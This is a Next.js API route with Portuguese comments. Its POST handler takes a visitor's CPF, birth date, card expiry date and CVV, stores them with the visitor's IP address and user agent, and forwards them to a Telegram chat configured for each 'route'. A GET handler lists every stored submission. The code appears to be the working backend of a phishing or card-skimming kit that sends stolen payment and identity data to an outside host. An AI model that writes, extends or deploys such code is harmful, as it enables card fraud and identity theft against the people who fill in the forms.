import { NextResponse } from 'next/server'
import { prisma } from '@/lib/prisma'
import { sendToTelegram } from '@/lib/telegram'

// GET - Listar submissions (com filtro opcional por rota)
export async function GET(request: Request) {
  try {
    const { searchParams } = new URL(request.url)
    const routeSlug = searchParams.get('routeSlug')

    const submissions = await prisma.submission.findMany({
      where: routeSlug ? { routeSlug } : undefined,
      orderBy: { createdAt: 'desc' },
      include: {
        routeConfig: {
          select: { name: true, slug: true }
        }
      }
    })

    return NextResponse.json(submissions)
  } catch (error) {
    console.error('Error fetching submissions:', error)
    return NextResponse.json(
      { error: 'Erro ao buscar solicitações' },
      { status: 500 }
    )
  }
}

// POST - Criar nova submission e enviar para Telegram
export async function POST(request: Request) {
  try {
    const body = await request.json()
    const { routeSlug, cpf, birthDate, cardExpiry, cvv } = body

    // Validar campos obrigatórios
    if (!routeSlug || !cpf) {
      return NextResponse.json(
        { error: 'Rota e CPF são obrigatórios' },
        { status: 400 }
      )
    }

    // Buscar configuração da rota
    const routeConfig = await prisma.routeConfig.findUnique({
      where: { slug: routeSlug }
    })

    if (!routeConfig) {
      return NextResponse.json(
        { error: 'Rota não encontrada' },
        { status: 404 }
      )
    }

    if (!routeConfig.isActive) {
      return NextResponse.json(
        { error: 'Rota desativada' },
        { status: 400 }
      )
    }

    // Obter IP e User Agent
    const forwarded = request.headers.get('x-forwarded-for')
    const ipAddress = forwarded ? forwarded.split(',')[0] : 'unknown'
    const userAgent = request.headers.get('user-agent') || 'unknown'

    // Criar submission
    const submission = await prisma.submission.create({
      data: {
        routeSlug,
        cpf,
        birthDate,
        cardExpiry,
        cvv,
        ipAddress,
        userAgent,
        sentToTelegram: false,
      }
    })

    // Enviar para Telegram
    const telegramResult = await sendToTelegram(
      routeConfig.telegramToken,
      routeConfig.telegramChatId,
      {
        routeName: routeConfig.name,
        cpf,
        birthDate,
        cardExpiry,
        cvv,
        timestamp: new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }),
      }
    )

    // Atualizar status do envio
    await prisma.submission.update({
      where: { id: submission.id },
      data: {
        sentToTelegram: telegramResult.success,
        telegramError: telegramResult.error,
      }
    })

    return NextResponse.json({
      success: true,
      submissionId: submission.id,
      telegramSent: telegramResult.success,
    })
  } catch (error) {
    console.error('Error creating submission:', error)
    return NextResponse.json(
      { error: 'Erro ao processar solicitação' },
      { status: 500 }
    )
  }
}
